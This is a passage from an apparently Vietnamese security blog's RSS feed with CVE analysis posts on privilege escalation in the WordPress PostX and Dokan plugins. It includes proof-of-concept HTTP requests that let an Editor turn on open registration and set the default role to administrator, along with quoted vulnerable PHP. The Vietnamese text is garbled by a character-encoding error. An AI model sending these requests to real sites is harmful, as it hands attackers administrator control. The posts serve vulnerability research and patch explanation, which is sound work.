users_can_register&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;D√πng Editor account ƒë·ªÉ t·∫°o post&lt;/li&gt;&#xA;&lt;li&gt;G·ªçi &lt;code&gt;wpApiSettings.nonce&lt;/code&gt; trong &lt;strong&gt;browser console&lt;/strong&gt; ƒë·ªÉ l·∫•y nonce&lt;/li&gt;&#xA;&lt;li&gt;G·ª≠i request v·ªõi nonce v·ª´a l·∫•y:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Request 1&lt;/strong&gt;:&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/ultp/v1/postx_presets/ HTTP/1.1&#xA;Host: localhost&#xA;Cookie: editor_cookie &#xA;X-WP-Nonce: valid_nonce&#xA;&#xA;type=set&amp;amp;key=users_can_register&amp;amp;data=1&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Request 2&lt;/strong&gt;:&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/ultp/v1/postx_presets/ HTTP/1.1&#xA;Host: localhost&#xA;Cookie: editor_cookie &#xA;X-WP-Nonce: valid_nonce&#xA;&#xA;type=set&amp;amp;key=default_role&amp;amp;data=administrator&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-05-cve-2025-55707/default.png&#34; title=&#34;Default role&#34; data-thumbnail=&#34;/posts/2026-01-05-cve-2025-55707/default.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Default role&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-05-cve-2025-55707/default.png&#39; alt=&#34;Result&#34; height=&#34;883&#34; width=&#34;1485&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Default role&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;T·∫°o user m·ªõi v√† login&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng CVE-2025-53425 xu·∫•t ph√°t t·ª´ vi·ªác &lt;strong&gt;k·∫øt h·ª£p kh√¥ng nh·∫•t qu√°n gi·ªØa ki·ªÉm so√°t quy·ªÅn ·ªü m·ª©c REST API v√† logic x·ª≠ l√Ω trong callback&lt;/strong&gt;. M·∫∑c d√π endpoint REST ch·ªâ y√™u c·∫ßu quy·ªÅn &lt;code&gt;edit_posts&lt;/code&gt;, nh∆∞ng h√†nh vi nguy hi·ªÉm nh·∫•t (&lt;code&gt;update_option()&lt;/code&gt;) l·∫°i ƒë∆∞·ª£c b·∫£o v·ªá b·∫±ng &lt;code&gt;edit_others_posts&lt;/code&gt;, cho ph√©p &lt;strong&gt;Editor&lt;/strong&gt; th·ª±c hi·ªán c√°c thay ƒë·ªïi nh·∫°y c·∫£m trong b·∫£ng &lt;code&gt;wp_options&lt;/code&gt;. Khi k·∫øt h·ª£p v·ªõi REST API nonce h·ª£p l·ªá, m·ªôt Editor c√≥ th·ªÉ l·ª£i d·ª•ng endpoint n√†y ƒë·ªÉ thay ƒë·ªïi c√°c option quan tr·ªçng, d·∫´n ƒë·∫øn &lt;strong&gt;Privilege Escalation&lt;/strong&gt;. B·∫£n v√° ·ªü phi√™n b·∫£n &lt;code&gt;4.1.36&lt;/code&gt; ƒë√£ kh·∫Øc ph·ª•c tri·ªát ƒë·ªÉ v·∫•n ƒë·ªÅ b·∫±ng c√°ch gi·ªõi h·∫°n endpoint ch·ªâ cho ng∆∞·ªùi d√πng c√≥ quy·ªÅn &lt;code&gt;manage_options&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;permission_callback&lt;/code&gt; ph·∫£i &lt;strong&gt;ph·∫£n √°nh ch√≠nh x√°c m·ª©c ƒë·ªô nh·∫°y c·∫£m c·ªßa h√†nh vi trong callback&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;update_option()&lt;/code&gt; l√† h√†m &lt;strong&gt;r·∫•t nguy hi·ªÉm&lt;/strong&gt; n·∫øu kh√¥ng b·ªã gi·ªõi h·∫°n quy·ªÅn ch·∫∑t ch·∫Ω&lt;/li&gt;&#xA;&lt;li&gt;REST API nonce &lt;strong&gt;ch·ªâ ch·ªëng CSRF&lt;/strong&gt;, kh√¥ng thay th·∫ø cho ki·ªÉm so√°t ph√¢n quy·ªÅn&lt;/li&gt;&#xA;&lt;li&gt;Editor &lt;strong&gt;kh√¥ng n√™n&lt;/strong&gt; ƒë∆∞·ª£c ph√©p thay ƒë·ªïi c√°c global option ·∫£nh h∆∞·ªüng ƒë·∫øn to√†n h·ªá th·ªëng&lt;/li&gt;&#xA;&lt;li&gt;V√° l·ªói hi·ªáu qu·∫£ nh·∫•t l√† &lt;strong&gt;ƒë·∫∑t quy·ªÅn cao ngay t·ª´ REST endpoint&lt;/strong&gt;, thay v√¨ ki·ªÉm tra r·∫£i r√°c trong callback&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ultimate-post/vulnerability/wordpress-postx-plugin-4-1-35-privilege-escalation-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress PostX Plugin &amp;lt;= 4.1.35 is vulnerable to a medium priority Privilege Escalation&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-53425 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2026-01-04-cve-2025-53425/</link>
      <pubDate>Sun, 04 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2026-01-04-cve-2025-53425/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-04-cve-2025-53425/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;G√°n Quy·ªÅn Kh√¥ng Ch√≠nh X√°c&lt;/strong&gt; (&lt;strong&gt;Incorrect Privilege Assignment&lt;/strong&gt;) trong &lt;strong&gt;Dokan, Inc. Dokan dokan-lite&lt;/strong&gt; cho ph√©p &lt;strong&gt;Leo Thang ƒê·∫∑c Quy·ªÅn&lt;/strong&gt; (&lt;strong&gt;Privilege Escalation&lt;/strong&gt;). V·∫•n ƒë·ªÅ n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn &lt;strong&gt;Dokan&lt;/strong&gt; t·ª´ &lt;strong&gt;n/a&lt;/strong&gt; ƒë·∫øn &lt;strong&gt;&amp;lt;= 4.1.2&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-53425&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-53425&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Privilege Escalation&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.1.3&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.1.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (7.2)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Shop manager&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/dokan-lite/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Dokan Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Dokan&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.1.3&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4.1.4&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;WooCommerce Plugin&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://wordpress.org/plugins/woocommerce/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;WooCommerce&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Ghi ch√∫&lt;/p&gt;&lt;p&gt;Plugin &lt;strong&gt;c·∫ßn WooCommerce ƒë·ªÉ ho·∫°t ƒë·ªông&lt;/strong&gt;, v√¨ n√≥ &lt;strong&gt;t√≠ch h·ª£p v√† ho·∫°t ƒë·ªông tr·ª±c ti·∫øp v·ªõi WooCommerce&lt;/strong&gt; nh·∫±m qu·∫£n l√Ω &lt;strong&gt;s·∫£n ph·∫©m, ƒë∆°n h√†ng v√† quy tr√¨nh thanh to√°n&lt;/strong&gt; m·ªôt c√°ch ƒë·∫ßy ƒë·ªß v√† hi·ªáu qu·∫£.&lt;/p&gt;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_dokan_save_settings&amp;#39;, [ $this, &amp;#39;save_settings_value&amp;#39; ], 10 );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_ajax_&lt;/code&gt; l√† hook d√†nh cho ng∆∞·ªùi d√πng &lt;strong&gt;ƒë√£ ƒëƒÉng nh·∫≠p&lt;/strong&gt;.&#xA;Khi c√≥ request ƒë·∫øn endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; v·ªõi param &lt;code&gt;action=dokan_save_settings&lt;/code&gt; th√¨ callback &lt;code&gt;save_settings_value&lt;/code&gt; s·∫Ω ƒë∆∞·ª£c g·ªçi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function save_settings_value() {&#xA;    try {&#xA;        if ( ! current_user_can( &amp;#39;manage_woocommerce&amp;#39; ) ) {&#xA;            throw new DokanException( &amp;#39;dokan_settings_unauthorized_operation&amp;#39;, __( &amp;#39;You are not authorized to perform this action.&amp;#39;, &amp;#39;dokan-lite&amp;#39; ), 401 );&#xA;        }&#xA;&#xA;        if ( ! isset( $_POST[&amp;#39;nonce&amp;#39;] ) || ! wp_verify_nonce( sanitize_key( wp_unslash( $_POST[&amp;#39;nonce&amp;#39;] ) ), &amp;#39;dokan_admin&amp;#39; ) ) {&#xA;            throw new DokanException( &amp;#39;dokan_settings_invalid_nonce&amp;#39;, __( &amp;#39;Invalid nonce&amp;#39;, &amp;#39;dokan-lite&amp;#39; ), 403 );&#xA;        }&#xA;&#xA;        if ( empty( $_POST[&amp;#39;section&amp;#39;] ) ) {&#xA;            throw new DokanException( &amp;#39;dokan_settings_error_saving&amp;#39;, __( &amp;#39;`section` parameter is required.&amp;#39;, &amp;#39;dokan-lite&amp;#39; ), 400 );&#xA;        }&#xA;&#xA;        $option_name  = sanitize_text_field( wp_unslash( $_POST[&amp;#39;section&amp;#39;] ) );&#xA;        $option_value = $this-&amp;gt;sanitize_options( wp_unslash( $_POST[&amp;#39;settingsData&amp;#39;] ), &amp;#39;edit&amp;#39; ); // phpcs:ignore&#xA;        $option_value = apply_filters( &amp;#39;dokan_save_settings_value&amp;#39;, $option_value, $option_name );&#xA;        $old_options  = get_option( $option_name, [] );&#xA;&#xA;        /**&#xA;         * @since 3.5.1 added $old_options parameter&#xA;         */&#xA;        do_action( &amp;#39;dokan_before_saving_settings&amp;#39;, $option_name, $option_value, $old_options );&#xA;&#xA;        update_option( $option_name, $option_value );&#xA;&#xA;        /**&#xA;         * @since 3.5.1 added $old_options parameter&#xA;         */&#xA;        do_action( &amp;#39;dokan_after_saving_settings&amp;#39;, $option_name, $option_value, $old_options );&#xA;&#xA;        // only flush rewrite rules if store url has been changed&#xA;        if ( &amp;#39;dokan_general&amp;#39; === $option_name &amp;amp;&amp;amp; isset( $old_options[&amp;#39;custom_store_url&amp;#39;] ) &amp;amp;&amp;amp; $old_options[&amp;#39;custom_store_url&amp;#39;] !== $option_value[&amp;#39;custom_store_url&amp;#39;] ) {&#xA;            dokan()-&amp;gt;rewrite-&amp;gt;register_rule();&#xA;            flush_rewrite_rules();&#xA;        }&#xA;&#xA;        wp_send_json_success(&#xA;            [&#xA;                &amp;#39;settings&amp;#39; =&amp;gt; [&#xA;                    &amp;#39;name&amp;#39;  =&amp;gt; $option_name,&#xA;                    &amp;#39;value&amp;#39; =&amp;gt; apply_filters( &amp;#39;dokan_get_settings_values&amp;#39;, $this-&amp;gt;sanitize_options( $option_value, &amp;#39;read&amp;#39; ), $option_name ),&#xA;                ],&#xA;                &amp;#39;message&amp;#39;  =&amp;gt; __( &amp;#39;Setting has been saved successfully.&amp;#39;, &amp;#39;dokan-lite&amp;#39; ),&#xA;            ]&#xA;        );&#xA;    } catch ( Exception $e ) {&#xA;        $error_code = $e-&amp;gt;getCode() ? $e-&amp;gt;getCode() : 422;&#xA;&#xA;        wp_send_json_error( new WP_Error( &amp;#39;dokan_settings_error&amp;#39;, $e-&amp;gt;getMessage() ), $error_code );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m th·ª±c hi·ªán ki·ªÉm tra quy·ªÅn ng∆∞·ªùi d√πng b·∫±ng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;current_user_can( &amp;#39;manage_woocommerce&amp;#39; )&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong ƒë√≥, &lt;code&gt;manage_woocommerce&lt;/code&gt; l√† m·ªôt &lt;strong&gt;capability&lt;/strong&gt; ƒë∆∞·ª£c ƒëƒÉng k√Ω b·ªüi plugin &lt;strong&gt;WooCommerce&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Quy·ªÅn n√†y ƒë∆∞·ª£c khai b√°o trong h√†m &lt;code&gt;get_core_capabilities()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function get_core_capabilities() {&#xA;    $capabilities = array();&#xA;&#xA;    $capabilities[&amp;#39;core&amp;#39;] = array(&#xA;        &amp;#39;manage_woocommerce&amp;#39;,&#xA;        &amp;#39;create_customers&amp;#39;,&#xA;        &amp;#39;view_woocommerce_reports&amp;#39;,&#xA;    );&#xA;&#xA;    $capability_types = array( &amp;#39;product&amp;#39;, &amp;#39;shop_order&amp;#39;, &amp;#39;shop_coupon&amp;#39; );&#xA;&#xA;    foreach ( $capability_types as $capability_type ) {&#xA;&#xA;        $capabilities[ $capability_type ] = array(&#xA;            // Post type.&#xA;            &amp;#34;edit_{$capability_type}&amp;#34;,&#xA;            &amp;#34;read_{$capability_type}&amp;#34;,&#xA;            &amp;#34;delete_{$capability_type}&amp;#34;,&#xA;            &amp;#34;edit_{$capability_type}s&amp;#34;,&#xA;            &amp;#34;edit_others_{$capability_type}s&amp;#34;,&#xA;            &amp;#34;publish_{$capability_type}s&amp;#34;,&#xA;            &amp;#34;read_private_{$capability_type}s&amp;#34;,&#xA;            &amp;#34;delete_{$capability_type}s&amp;#34;,&#xA;            &amp;#34;delete_private_{$capability_type}s&amp;#34;,&#xA;            &amp;#34;delete_published_{$capability_type}s&amp;#34;,&#xA;            &amp;#34;delete_others_{$capability_type}s&amp;#34;,&#xA;            &amp;#34;edit_private_{$capability_type}s&amp;#34;,&#xA;            &amp;#34;edit_published_{$capability_type}s&amp;#34;,&#xA;&#xA;            // Terms.&#xA;            &amp;#34;manage_{$capability_type}_terms&amp;#34;,&#xA;            &amp;#34;edit_{$capability_type}_terms&amp;#34;,&#xA;            &amp;#34;delete_{$capability_type}_terms&amp;#34;,&#xA;            &amp;#34;assign_{$capability_type}_terms&amp;#34;,&#xA;        );&#xA;    }&#xA;&#xA;    return $capabilities;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m n√†y ƒë·ªãnh nghƒ©a &lt;strong&gt;c√°c quy·ªÅn c·ªët l√µi c·ªßa WooCommerce&lt;/strong&gt;, trong ƒë√≥ nh√≥m &lt;code&gt;core&lt;/code&gt; bao g·ªìm c√°c quy·ªÅn quan tr·ªçng nh∆∞:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;manage_woocommerce&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;create_customers&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;view_woocommerce_reports&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;C√°c quy·ªÅn n√†y sau ƒë√≥ ƒë∆∞·ª£c s·ª≠ d·ª•ng trong h√†m 